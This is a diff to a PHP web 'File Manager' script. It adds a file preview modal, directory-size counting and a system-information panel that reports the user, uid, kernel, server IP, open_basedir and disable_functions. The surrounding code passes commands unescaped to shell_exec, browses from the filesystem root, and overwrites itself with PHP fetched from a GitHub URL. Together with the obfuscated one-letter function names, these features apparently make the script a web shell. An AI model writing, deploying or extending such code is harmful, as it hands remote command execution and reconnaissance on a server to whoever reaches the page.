@@ -141,10 +141,12 @@ function W(){
         $ico = $isLink ? "&#x1F517;" : ($isDir ? "&#x1F4C1;" : "&#x1F4C4;");
         $cls = $isDir ? "dir-name" : "file-name";
         $nameLink = "<span class='ico'>{$ico}</span> " . H("?path=" . $encFull, "<span class='{$cls}'>{$safeName}</span>");
-        $size = $isDir ? "<span class='badge badge-dir'>DIR</span>" : "<span class='muted'>" . K((int)@filesize($full)) . "</span>";
+        $size = $isDir
+            ? "<span class='badge badge-dir'>DIR</span> <a href='?dirsize=" . $encItem . "&path=" . $encDir . "' class='dir-size'>Calc</a>"
+            : "<span class='muted'>" . K((int)@filesize($full)) . "</span>";
         $mod = "<span class='muted'>" . L($full) . "</span>";
         $actions = H("?zip=" . $encItem . "&path=" . $encDir, "Zip")
-            . ($isDir ? "" : H("?edit=" . $encItem . "&path=" . $encDir, "Edit") . H("?download=" . $encItem . "&path=" . $encDir, "DL"))
+            . ($isDir ? "" : H("?preview=" . $encItem . "&path=" . $encDir, "View") . H("?edit=" . $encItem . "&path=" . $encDir, "Edit") . H("?download=" . $encItem . "&path=" . $encDir, "DL"))
             . H("?delete=" . $encItem . "&path=" . $encDir, "Del");
         $rows[] = [$nameLink, $size, $mod, $actions];
     }
@@ -188,25 +190,16 @@ function ZIP($fullPath){ if(!class_exists('ZipArchive')) return false;
     exit();
 }
 function RUN($cmd, $cwd = null, $timeout = 15){ if($cmd === "" || $cmd === null) { return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0]; } $cwd = $cwd ? $cwd : J(); $output = shell_exec("cd $cwd && $cmd 2>&1"); $exitCode = 0; preg_match('/^.*\n([0-9]+)$/', $output, $matches); if($matches) $exitCode = (int)$matches[1]; return ["out"=>trim($output), "err"=>"", "code"=>$exitCode, "time"=>0]; }
-function is_ajax(){
-    return D("ajax") || C("ajax") || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
-}
+function is_ajax(){ return D("ajax") || C("ajax") || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest'); }
 function fetch_url($url){
     if(function_exists('curl_init')){
         $ch = curl_init($url);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT => 15,
-            CURLOPT_USERAGENT => 'phfm-updater/1.0'
-        ]);
-        $data = curl_exec($ch);
-        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
+        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_TIMEOUT=>15, CURLOPT_USERAGENT=>'phfm-updater/1.0']);
+        $data = curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
         if($data !== false && $code >= 200 && $code < 300) return $data;
     }
     if(ini_get('allow_url_fopen')){
-        $ctx = stream_context_create(['http' => ['timeout' => 15, 'header' => "User-Agent: phfm-updater/1.0\r\n"]]);
+        $ctx = stream_context_create(['http'=>['timeout'=>15,'header'=>"User-Agent: phfm-updater/1.0\r\n"]]);
         $data = @file_get_contents($url, false, $ctx);
         if($data !== false) return $data;
     }
@@ -215,87 +208,117 @@ function fetch_url($url){
 function self_update(){
     $selfName = basename(__FILE__);
     $remoteName = ($selfName === 'pfm.php' || $selfName === 'phfm.php') ? $selfName : 'phfm.php';
-    $url = "https://raw.githubusercontent.com/cdprf/php-file-manager/main/" . $remoteName;
-    $data = fetch_url($url);
-    if($data === false || strlen($data) < 500 || strpos(ltrim($data), '<?php') !== 0){
-        return [false, "Update failed: invalid or empty response"];
-    }
+    $data = fetch_url("https://raw.githubusercontent.com/cdprf/php-file-manager/main/" . $remoteName);
+    if($data === false || strlen($data) < 500 || strpos(ltrim($data), '<?php') !== 0) return [false, "Update failed: invalid or empty response"];
     $tmp = sys_get_temp_dir() . "/phfm_upd_" . uniqid() . ".php";
-    if(@file_put_contents($tmp, $data) === false){
-        return [false, "Update failed: cannot write temp file"];
-    }
-    if(hash_file('sha256', $tmp) === hash_file('sha256', __FILE__)){
-        @unlink($tmp);
-        return [true, "Already up to date"];
-    }
-    if(!@copy($tmp, __FILE__)){
-        @unlink($tmp);
-        return [false, "Update failed: cannot overwrite " . $selfName];
-    }
+    if(@file_put_contents($tmp, $data) === false) return [false, "Update failed: cannot write temp file"];
+    if(hash_file('sha256', $tmp) === hash_file('sha256', __FILE__)){ @unlink($tmp); return [true, "Already up to date"]; }
+    if(!@copy($tmp, __FILE__)){ @unlink($tmp); return [false, "Update failed: cannot overwrite " . $selfName]; }
     @unlink($tmp);
     return [true, "Updated successfully from GitHub (" . $remoteName . ")"];
 }
-function respond($ok, $msg){
+function dir_size($path){
+    if(!is_dir($path)) return false;
+    $bytes = 0;
+    try{
+        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
+        foreach($it as $f){ if(!$f->isLink() && $f->isFile()) $bytes += $f->getSize(); }
+    }catch(Exception $e){ return false; }
+    return K($bytes);
+}
+function preview_file($path){
+    if(!is_file($path)) return [false, "File not found", ""];
+    $name = basename($path);
+    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+    $imgExts = ['png','jpg','jpeg','gif','webp','svg'];
+    if(in_array($ext, $imgExts)){
+        $mime = $ext === 'svg' ? 'image/svg+xml' : ($ext === 'jpg' ? 'image/jpeg' : 'image/'.$ext);
+        $raw = @file_get_contents($path, false, null, 0, 2097152);
+        if($raw === false) return [false, "Cannot read file", ""];
+        return [true, $name, "<img src='data:".$mime.";base64,".base64_encode($raw)."' style='max-width:100%;max-height:70vh;border-radius:6px'/>"];
+    }
+    $raw = @file_get_contents($path, false, null, 0, 524288);
+    if($raw === false) return [false, "Cannot read file", ""];
+    $note = filesize($path) > 524288 ? "<div class='muted' style='margin-bottom:6px'>Showing first 512 KB</div>" : "";
+    return [true, $name, $note."<pre style='max-height:70vh;margin:0'>".htmlspecialchars($raw, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')."</pre>"];
+}
+function sys_info(){
+    $who = function_exists('shell_exec') ? trim((string)@shell_exec('whoami')) : '';
+    if($who === '' && function_exists('posix_geteuid') && function_exists('posix_getpwuid')){
+        $pw = @posix_getpwuid(posix_geteuid());
+        $who = isset($pw['name']) ? $pw['name'] : '';
+    }
+    if($who === '') $who = @get_current_user() ?: '--';
+    $uid = function_exists('posix_getuid') ? posix_getuid().'/'.posix_getgid() : @getmyuid().'/'.@getmygid();
+    $dir = J();
+    $df = @disk_free_space($dir);
+    $dt = @disk_total_space($dir);
+    $disk = ($df !== false && $dt !== false) ? K($df).' / '.K($dt) : '--';
+    $rows = [
+        ['User (whoami)', $who.' (uid/gid: '.$uid.')'],
+        ['Hostname', @gethostname() ?: '--'],
+        ['OS / Kernel', @php_uname() ?: PHP_OS],
+        ['PHP Version', PHP_VERSION],
+        ['Server', isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '--'],
+        ['Server IP', isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(@gethostname() ?: 'localhost')],
+        ['Document Root', isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '--'],
+        ['Disk Free / Total', $disk],
+        ['Extensions', 'ZipArchive: '.(class_exists('ZipArchive')?'yes':'no').' | cURL: '.(function_exists('curl_init')?'yes':'no')],
+        ['open_basedir', ini_get('open_basedir') ?: 'none'],
+        ['disable_functions', ini_get('disable_functions') ?: 'none'],
+    ];
+    $h = "<div class='card'><h3>System Info</h3><table><tbody>";
+    foreach($rows as $r){
+        $h .= "<tr><td style='width:180px;color:#94a3b8'>".htmlspecialchars($r[0], ENT_QUOTES, 'UTF-8')."</td><td>".htmlspecialchars((string)$r[1], ENT_QUOTES, 'UTF-8')."</td></tr>";
+    }
+    return $h."</tbody></table></div>";
+}
+function respond($ok, $msg, $extra = []){
     if(is_ajax()){
         header("Content-Type: application/json; charset=UTF-8");
-        echo json_encode(["ok" => (bool)$ok, "msg" => (string)$msg]);
+        echo json_encode(array_merge(["ok" => (bool)$ok, "msg" => (string)$msg], $extra));
         exit();
     }
     Y($msg);
 }
 function render_css(){
     return "<style>
-*{box-sizing:border-box}
-body{margin:0;padding:24px;background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.5}
-.wrap{max-width:1120px;margin:0 auto}
-.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin-bottom:16px;box-shadow:0 4px 16px rgba(0,0,0,.25)}
+*{box-sizing:border-box}body{margin:0;padding:24px;background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.5}
+.wrap{max-width:1120px;margin:0 auto}.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin-bottom:16px;box-shadow:0 4px 16px rgba(0,0,0,.25)}
 .login-box{max-width:360px;margin:80px auto;background:#1e293b;border:1px solid #334155;border-radius:12px;padding:24px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
-.login-box h3{margin:0 0 14px;font-size:18px;color:#f8fafc}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px}
-.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
-h3{margin:0 0 10px;font-size:15px;color:#f1f5f9}
-form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:0}
+.login-box h3,h3{margin:0 0 12px;font-size:16px;color:#f8fafc}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px}
+form,.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:0}
 input[type=text],input[type=password],input[type=number],input[type=file],textarea{background:#0f172a;color:#f1f5f9;border:1px solid #475569;border-radius:6px;padding:8px 10px;font-family:ui-monospace,Consolas,monospace;font-size:13px;outline:none}
-input[type=text]:focus,input[type=password]:focus,input[type=number]:focus,textarea:focus{border-color:#38bdf8}
-input[type=text],input[type=password]{flex:1;min-width:140px}
+input:focus,textarea:focus{border-color:#38bdf8}input[type=text],input[type=password]{flex:1;min-width:140px}
 input[type=submit],button{background:#2563eb;color:#fff;border:none;border-radius:6px;padding:8px 14px;font-weight:600;cursor:pointer;font-size:13px;transition:background .15s}
-input[type=submit]:hover,button:hover{background:#1d4ed8}
-a{color:#38bdf8;text-decoration:none}
-a:hover{text-decoration:underline}
-.nav{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+input[type=submit]:hover,button:hover{background:#1d4ed8}a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
+.nav,.crumb{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
 .nav a{background:#1e293b;border:1px solid #334155;padding:6px 12px;border-radius:6px;font-size:13px;font-family:ui-monospace,Consolas,monospace}
-.nav a:hover{background:#334155;text-decoration:none}
+.nav a:hover,.crumb a:hover{background:#334155;text-decoration:none}.crumb{background:#1e293b;border:1px solid #334155;border-radius:8px;padding:8px 12px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
+.crumb a{padding:2px 6px;border-radius:4px}.crumb .sep{color:#64748b}
 table{width:100%;border-collapse:collapse;background:#1e293b;border:1px solid #334155;border-radius:10px;overflow:hidden;font-family:ui-monospace,Consolas,monospace;font-size:13px}
 thead th{background:#0f172a;color:#94a3b8;text-align:left;padding:10px 12px;border-bottom:1px solid #334155;font-weight:600}
-tbody td{padding:9px 12px;border-bottom:1px solid #263244}
-tbody tr:hover{background:#263244}
+tbody td{padding:9px 12px;border-bottom:1px solid #263244}tbody tr:hover{background:#263244}
 tbody td:last-child a{display:inline-block;padding:3px 9px;border-radius:5px;background:#0f172a;border:1px solid #334155;margin-right:4px;font-size:12px;color:#cbd5e1}
-tbody td:last-child a:hover{background:#334155;color:#fff;text-decoration:none}
-tbody td:last-child a[href*='?delete=']{color:#f87171;border-color:#7f1d1d}
-tbody td:last-child a[href*='?delete=']:hover{background:#7f1d1d;color:#fff;text-decoration:none}
-.crumb{display:flex;align-items:center;flex-wrap:wrap;gap:4px;background:#1e293b;border:1px solid #334155;border-radius:8px;padding:8px 12px;margin-bottom:12px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
-.crumb a{color:#38bdf8;padding:2px 6px;border-radius:4px}
-.crumb a:hover{background:#334155;text-decoration:none}
-.crumb .sep{color:#64748b}
-.dir-head{display:flex;justify-content:space-between;align-items:center;margin:0 0 8px;color:#94a3b8;font-size:12px;font-family:ui-monospace,Consolas,monospace}
-.ico{display:inline-block;width:18px;text-align:center}
-.dir-name{color:#f8fafc;font-weight:600}
-.file-name{color:#cbd5e1}
-.muted{color:#94a3b8}
-.badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:11px;font-weight:600}
-.badge-dir{background:#172554;color:#60a5fa;border:1px solid #1e40af}
-.badge-up{background:#1e293b;color:#cbd5e1;border:1px solid #475569}
-tbody td:nth-child(2),tbody td:nth-child(3){white-space:nowrap}
-tbody td:last-child{white-space:nowrap;text-align:right}
-thead th:last-child{text-align:right}
+tbody td:last-child a:hover{background:#334155;color:#fff;text-decoration:none}tbody td:last-child a[href*='?delete=']{color:#f87171;border-color:#7f1d1d}tbody td:last-child a[href*='?delete=']:hover{background:#7f1d1d;color:#fff}
+.dir-head{display:flex;justify-content:space-between;margin:0 0 8px;color:#94a3b8;font-size:12px;font-family:ui-monospace,Consolas,monospace}
+.ico{display:inline-block;width:18px;text-align:center}.dir-name{color:#f8fafc;font-weight:600}.file-name{color:#cbd5e1}.muted{color:#94a3b8}
+.badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:11px;font-weight:600}.badge-dir{background:#172554;color:#60a5fa;border:1px solid #1e40af}.badge-up{background:#1e293b;color:#cbd5e1;border:1px solid #475569}
+tbody td:nth-child(2),tbody td:nth-child(3){white-space:nowrap}tbody td:last-child,thead th:last-child{white-space:nowrap;text-align:right}
 pre{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px;overflow:auto;color:#e2e8f0}
 #phfm-msg{display:none;padding:10px 14px;margin-bottom:14px;border-radius:8px;border:1px solid #334155;font-weight:500}
+.modal{display:none;position:fixed;inset:0;background:rgba(2,6,23,.78);z-index:999;align-items:center;justify-content:center;padding:20px}
+.modal.open{display:flex}.modal-box{background:#1e293b;border:1px solid #334155;border-radius:12px;max-width:920px;width:100%;max-height:88vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.6)}
+.modal-hd{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid #334155;background:#0f172a}.modal-hd b{font-family:ui-monospace,Consolas,monospace;color:#f8fafc}.modal-bd{padding:16px;overflow:auto}
 </style>";
 }
 if(!I()){
     $err = C("login") ? "<p style='color:#f87171;margin:0 0 10px'>Invalid password</p>" : "";
     Y("<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>".render_css()."</head><body><div class='login-box'><h3>File Manager</h3>".$err.F("POST", ["password"=>["pass",""], "submit"=>["login","Login"]])."</div></body></html>");
 }
+if(D("preview")){ list($ok, $title, $html) = preview_file(rtrim(J(), "/\\") . "/" . sanitize_path(D("preview"))); respond($ok, $title, ["html" => $html]); }
+if(D("dirsize")){ $sz = dir_size(rtrim(J(), "/\\") . "/" . sanitize_path(D("dirsize"))); respond($sz !== false, $sz !== false ? $sz : "Cannot calculate size"); }
+if(D("sysinfo")){ $html = sys_info(); if(is_ajax()) respond(true, "System info loaded", ["html" => $html]); Y("<!DOCTYPE html><html><head><meta charset='utf-8'>".render_css()."</head><body><div class='wrap'>".$html."</div></body></html>"); }
 if(D("update")){ list($ok, $msg) = self_update(); respond($ok, $msg); }
 if(D("delete")){
     $delPath = sanitize_path(D("delete"));
@@ -349,10 +372,13 @@ $ui .= H("?path=".urlencode("/"), "[/ Root]");
 $ui .= H("?path=".urlencode(U(J())), "[Directory Up]");
 $ui .= H("?zip=.&path=".urlencode(J()), "[Bu dizini ZIP indir]");
 $ui .= H("?update=1&path=".urlencode(J()), "[Update]");
+$ui .= H("?sysinfo=1&path=".urlencode(J()), "[System Info]");
 $ui .= (stripos(PHP_OS, "WIN")===0?V():"");
 $ui .= "</div>";
+$ui .= "<div id='phfm-sys'></div>";
 $ui .= render_breadcrumb(J());
 $ui .= "<div id='phfm-list'>".(is_dir(J())?W():"<div class='card'><h3>".htmlspecialchars(basename(J()), ENT_QUOTES, 'UTF-8')."</h3><pre>".Q(J())."</pre></div>")."</div>";
+$ui .= "<div id='phfm-modal' class='modal'><div class='modal-box'><div class='modal-hd'><b id='phfm-mt'>Preview</b><button type='button' id='phfm-mc' style='background:#334155;padding:4px 10px'>X</button></div><div id='phfm-mb' class='modal-bd'></div></div></div>";
 $ui .= "<script>
 (function(){
   var msgBox = document.getElementById('phfm-msg');
@@ -373,7 +399,47 @@ $ui .= "<script>
         if(next && cur) cur.innerHTML = next.innerHTML;
       });
   }
+  var modal = document.getElementById('phfm-modal'), mTitle = document.getElementById('phfm-mt'), mBody = document.getElementById('phfm-mb');
+  function closeModal(){ if(modal) modal.classList.remove('open'); }
+  if(document.getElementById('phfm-mc')) document.getElementById('phfm-mc').onclick = closeModal;
+  if(modal) modal.onclick = function(e){ if(e.target === modal) closeModal(); };
+  document.addEventListener('keydown', function(e){ if(e.key === 'Escape') closeModal(); });
   document.addEventListener('click', function(e){
+    var prv = e.target.closest('a[href*=\"?preview=\"]');
+    if(prv){
+      e.preventDefault();
+      fetch(prv.href + '&ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
+        .then(function(r){ return r.json(); })
+        .then(function(res){
+          if(res.ok && modal){ mTitle.textContent = res.msg; mBody.innerHTML = res.html; modal.classList.add('open'); }
+          else showMsg(false, res.msg || 'Önizleme açılamadı');
+        })
+        .catch(function(){ showMsg(false, 'Önizleme alınamadı'); });
+      return;
+    }
+    var dsz = e.target.closest('a[href*=\"?dirsize=\"]');
+    if(dsz){
+      e.preventDefault();
+      var td = dsz.closest('td');
+      dsz.textContent = '...';
+      fetch(dsz.href + '&ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
+        .then(function(r){ return r.json(); })
+        .then(function(res){ if(res.ok && td){ td.textContent = res.msg; td.className = 'muted'; } else showMsg(false, res.msg || 'Hesaplanamadı'); })
+        .catch(function(){ dsz.textContent = 'Calc'; showMsg(false, 'Boyut hesaplanamadı'); });
+      return;
+    }
+    var sys = e.target.closest('a[href*=\"?sysinfo=\"]');
+    if(sys){
+      e.preventDefault();
+      var box = document.getElementById('phfm-sys');
+      if(box && box.innerHTML !== ''){ box.innerHTML = ''; return; }
+      var sUrl = sys.href + (sys.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
+      fetch(sUrl, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
+        .then(function(r){ return r.json(); })
+        .then(function(res){ if(res.ok && res.html && box) box.innerHTML = res.html; else showMsg(false, res.msg || 'Hata'); })
+        .catch(function(){ showMsg(false, 'Sistem bilgisi alınamadı'); });
+      return;
+    }
     var upd = e.target.closest('a[href*=\"?update=\"]');
     if(upd){
       e.preventDefault();
